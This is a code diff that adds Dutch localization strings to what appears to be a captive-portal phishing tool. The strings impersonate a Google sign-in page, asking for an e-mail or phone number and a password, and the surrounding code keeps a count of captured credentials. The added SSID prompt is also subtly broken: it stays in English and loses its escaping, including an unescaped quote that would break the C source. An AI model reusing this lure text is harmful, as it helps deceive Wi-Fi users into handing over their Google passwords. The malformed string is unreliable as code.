@@ -59,6 +59,16 @@
 #define LOGIN_BUTTON "Suivant"
 #define LOGIN_AFTER_MESSAGE "Connexion en cours. Merci de patienter quelques instants."
 #define TYPE_SSID_TEXT "La longueur du SSID doit être entre 2 et 32\nInvalide: ?,$,\",[,\\,],+\n\nÉcrivez le SSID\nPressez Entrée pour Valider\n\n"
+
+#elif defined(LANGUAGE_NL_NL)
+#define LOGIN_TITLE "Welkom"
+#define LOGIN_SUBTITLE "Log in met Google"
+#define LOGIN_EMAIL_PLACEHOLDER "E-mail of telefoonnummer"
+#define LOGIN_PASSWORD_PLACEHOLDER "Voer wachtwoord in"
+#define LOGIN_MESSAGE "Log in om veilig te browsen."
+#define LOGIN_BUTTON "Verder"
+#define LOGIN_AFTER_MESSAGE "Gegevens worden gecontroleerd..."
+#define TYPE_SSID_TEXT "SSID length should be between 2 and 32\nInvalid: ?,$,",[,,],+\n\nType the SSID\nPress Enter to Confirm\n\n"
 #endif
 
 int totalCapturedCredentials = 0;
